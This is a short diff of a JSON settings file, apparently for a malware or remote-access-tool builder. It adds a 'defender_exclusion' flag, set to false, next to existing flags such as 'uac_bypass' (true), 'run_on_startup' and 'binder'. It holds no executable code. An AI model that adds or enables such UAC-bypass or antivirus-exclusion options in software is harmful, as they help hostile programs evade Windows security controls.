@@ -6,5 +6,6 @@
     "uac_bypass": true,
     "single_instance": true,
     "run_on_startup": false,
+    "defender_exclusion": false,
     "binder": false
 }
